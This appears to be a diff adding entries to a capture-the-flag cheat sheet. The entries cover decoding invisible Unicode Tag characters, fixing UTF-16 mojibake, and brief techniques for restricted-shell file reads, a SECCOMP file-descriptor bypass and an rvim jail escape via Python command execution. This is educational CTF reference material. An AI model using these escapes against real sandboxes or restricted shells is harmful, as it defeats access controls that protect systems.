+### Unicode Tags Block (U+E0000-U+E007F) (UTCTF 2026)
+
+**Pattern (Hidden in Plain Sight):** Invisible Unicode Tag characters embedded in URLs, filenames, or text. Each tag codepoint maps directly to an ASCII character by subtracting `0xE0000`. URL-encoded as 4-byte UTF-8 sequences (`%F3%A0%81%...`).
+
+```python
+import urllib.parse
+
+url = "https://example.com/page#Title%20%F3%A0%81%B5%F3%A0%81%B4...Visible%20Text"
+decoded = urllib.parse.unquote(urllib.parse.urlparse(url).fragment)
+
+flag = ''.join(
+    chr(ord(ch) - 0xE0000)
+    for ch in decoded
+    if 0xE0000 <= ord(ch) <= 0xE007F
+)
+print(flag)
+```
+
+**Key insight:** Unicode Tags (U+E0001-U+E007F) mirror ASCII 1:1 — subtract `0xE0000` to recover the original character. They render as zero-width invisible glyphs in most fonts. Unlike Variation Selectors (U+E0100+), these have a simpler offset calculation and appear in URL fragments, challenge titles, or filenames where the text looks normal but has suspiciously long byte length.
+
+**Detection:** Text or URL is longer than expected in bytes. Percent-encoded sequences starting with `%F3%A0%80` or `%F3%A0%81`. Python: `any(0xE0000 <= ord(c) <= 0xE007F for c in text)`.
+
+## UTF-16 Endianness Reversal
+
+**Pattern (endians):** Text "turned to Japanese" -- mojibake from UTF-16 endianness mismatch.
+
+```python
+# If encoded as UTF-16-LE but decoded as UTF-16-BE:
+fixed = mojibake.encode('utf-16-be').decode('utf-16-le')
+```
+
+**Identification:** CJK characters, challenge mentions "translation" or "endian". See [encodings.md](encodings.md) for details.
 
 ## Cipher Identification Workflow
 
@@ -491,3 +478,19 @@ open(''.join(['fl','ag.txt'])).read()
 7. **Substitution** - Frequency analysis applicable
 
 **Auto-identify:** [dCode Cipher Identifier](https://www.dcode.fr/cipher-identifier)
+
+## HISTFILE Trick for Restricted Shell File Reads (BCTF 2016)
+
+Read files without cat/less/head: `HISTFILE=/flag /bin/bash && history`, or `bash -v flag.txt` (verbose mode prints lines), or `ctypes.sh` `dlcall` for direct C library calls. See [bashjails.md](bashjails.md#histfile-trick-for-restricted-shell-file-reads-bctf-2016).
+
+## Levenshtein Distance Oracle Attack (SunshineCTF 2016)
+
+Oracle returns edit distance between guess and secret. Determine length from empty string, identify present chars from single-char repeats, binary search for positions. O(n log n) queries. See [games-and-vms-3.md](games-and-vms-3.md#levenshtein-distance-oracle-attack-sunshinectf-2016).
+
+## SECCOMP High-Bit File Descriptor Bypass (33C3 CTF 2016)
+
+`close(0x8000000000000002)` passes 64-bit SECCOMP check (≠ 2) but kernel truncates to 32-bit (== 2), closing fd 2. Next `open()` returns fd 2 for arbitrary file. Type-width mismatch between BPF filter and kernel. See [games-and-vms-3.md](games-and-vms-3.md#seccomp-bypass-via-high-bit-file-descriptor-trick-33c3-ctf-2016).
+
+## rvim Jail Escape via Python3 (BKP 2017)
+
+`rvim` blocks `:!` but `:python3 import os; os.system("cmd")` executes arbitrary commands. Check `:version` for `+python3`/`+lua`/`+ruby`. See [games-and-vms-3.md](games-and-vms-3.md#rvim-jail-escape-via-custom-vimrc-with-python3-execution-bkp-2017).
